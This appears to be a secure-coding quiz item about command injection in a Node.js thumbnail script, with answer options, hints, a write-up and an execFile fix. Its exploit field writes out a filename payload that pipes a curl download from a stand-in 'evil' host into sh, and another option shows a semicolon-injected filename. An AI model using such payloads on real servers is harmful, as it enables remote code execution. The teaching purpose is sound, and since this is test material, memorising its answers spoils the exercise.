files.name: thumbnail.js

notes.3: Called with the path of an uploaded image (the filename is attacker-influenced).
notes.6: Builds the shell command string with `file` concatenated in.

options.label: `convert` is CPU-heavy, so repeated calls exhaust the server
options.whyWrong: Resource cost isn't the vulnerability; the shell interpreting the filename is.

options.label: The thumbnail path is predictable, letting attackers find it
options.whyWrong: Predictable output names are minor next to command execution.

options.label: `exec` runs the string in a shell and `file` (an attacker-influenced upload name) is concatenated in, so shell metacharacters execute
Wrap file in single quotes inside the command
options.diff:
-  const cmd = "convert " + file + " -resize 200x200 " + out;
+  const cmd = "convert '" + file + "' -resize 200x200 '" + out + "'";
options.whyWrong: A single quote in the filename closes the quote and resumes command context.

options.label: Use execFile('convert', [file, '-resize', '200x200', out]) so no shell parses the arguments
Strip spaces from file
options.whyWrong: Metacharacters like `;`, `|`, `&&`, `$()` and backticks need no spaces.

options.label: Reject filenames not ending in a known image extension
options.whyWrong: `x.jpg;id #.png` passes a suffix check and still injects; the shell is still involved.

training.exploit: Upload a file whose name is `x.jpg; curl http://evil/s | sh #`. When the thumbnailer runs, the shell executes `convert x.jpg ...` and then the injected command. Upload filenames are attacker-controlled, so no other input is needed.

hints.line: Which call hands a built string to a shell?
hints.bugClass: The filename reaches the OS shell.
hints.why: What parses `file` on line 7 — the program, or /bin/sh?
hints.fix: Pass arguments as an array with no shell.

writeup.summary: `exec` runs its argument through `/bin/sh`, and `file` — an attacker-influenced upload name — is concatenated into that string, so shell metacharacters in the name execute commands. `execFile('convert', [file, ...])` spawns the binary directly with `file` as one argument; there is no shell to interpret `;`, `|`, `$()`, or backticks. Quoting and suffix checks are bypassable.
